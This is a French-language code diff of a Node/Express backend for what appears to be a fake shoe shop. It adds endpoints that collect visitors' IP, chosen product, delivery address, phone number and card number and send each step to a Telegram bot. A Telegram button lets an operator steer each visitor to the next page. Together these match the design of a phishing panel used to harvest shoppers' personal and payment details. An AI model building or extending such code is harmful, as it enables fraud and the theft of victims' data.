@@ -25,11 +25,22 @@ const sessions = {};
 
 async function sendTelegramNotif(data){
   if(!BOT_TOKEN || !CHAT_ID) return;
+  let msg = `🆕 <b>Nouvelle interaction</b>\n`;
+  msg += `🆔 Session: ${data.sessionId}\n`;
+  msg += `🌐 IP: ${data.ip}\n`;
+  if(data.page) msg += `📄 Page: ${data.page}\n`;
+  if(data.pair) msg += `👟 Paire: ${data.pair}\n`;
+  if(data.delivery){
+    msg += `📦 Livraison: ${data.delivery.adresse}, Tel: ${data.delivery.telephone}\n`;
+  }
+  if(data.card){
+    msg += `💳 Carte: ${data.card.panMasked}\n`;
+  }
+  msg += `🕓 ${new Date().toLocaleString()}`;
 
-  const msg = `🆕 <b>NOUVEL USER</b>\n🆔 Session: ${data.sessionId}\n🌐 IP: ${data.ip}`;
   const keyboard = {
     inline_keyboard: [
-      [{ text:'➡️ Aller à la page suivante', callback_data:`next|${data.sessionId}|/index.html` }]
+      [{ text:'➡️ Aller à la page suivante', callback_data:`next|${data.sessionId}|/product.html` }]
     ]
   };
 
@@ -40,7 +51,6 @@ async function sendTelegramNotif(data){
   });
 }
 
-// Endpoint visite
 app.post('/api/visit', (req,res)=>{
   const sid = uuidv4();
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -49,17 +59,40 @@ app.post('/api/visit', (req,res)=>{
   res.json({ sessionId:sid });
 });
 
-// Endpoint achat
 app.post('/api/buy', (req,res)=>{
   const { sessionId, pair } = req.body;
   if(!sessions[sessionId]) return res.status(400).send('Session invalide');
   sessions[sessionId].data.pair = pair;
-  sessions[sessionId].data.page = 'Choix Paire';
+  sessions[sessionId].data.page = 'Produit';
   sendTelegramNotif(sessions[sessionId].data);
   res.json({ ok:true });
 });
 
-// Webhook Telegram pour redirection
+app.post('/api/delivery', (req,res)=>{
+  const { sessionId, adresse, telephone } = req.body;
+  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
+  sessions[sessionId].data.delivery = { adresse, telephone };
+  sessions[sessionId].data.page = 'Livraison';
+  sendTelegramNotif(sessions[sessionId].data);
+  res.json({ ok:true });
+});
+
+app.post('/api/payment', (req,res)=>{
+  const { sessionId, cardNumber } = req.body;
+  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
+  sessions[sessionId].data.card = { panMasked:'**** **** **** '+cardNumber.slice(-4) };
+  sessions[sessionId].data.page = 'Paiement';
+  sendTelegramNotif(sessions[sessionId].data);
+  res.json({ ok:true });
+});
+
+app.get('/api/status', (req,res)=>{
+  const { sessionId } = req.query;
+  if(!sessions[sessionId]) return res.json({});
+  const redirect = sessions[sessionId].redirect || null;
+  res.json({ redirect });
+});
+
 app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
   const body = req.body;
   if(body.callback_query){
@@ -75,13 +108,6 @@ app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
     });
   }
   res.sendStatus(200);
-});
-
-// Polling front-end pour redirection
-app.get('/api/status', (req,res)=>{
-  const { sessionId } = req.query;
-  if(!sessions[sessionId]) return res.json({});
-  res.json({ redirect: sessions[sessionId].redirect || null });
 });
 
 app.get('/', (_,res)=>res.sendFile(path.join(__dirname,'public','index.html')));
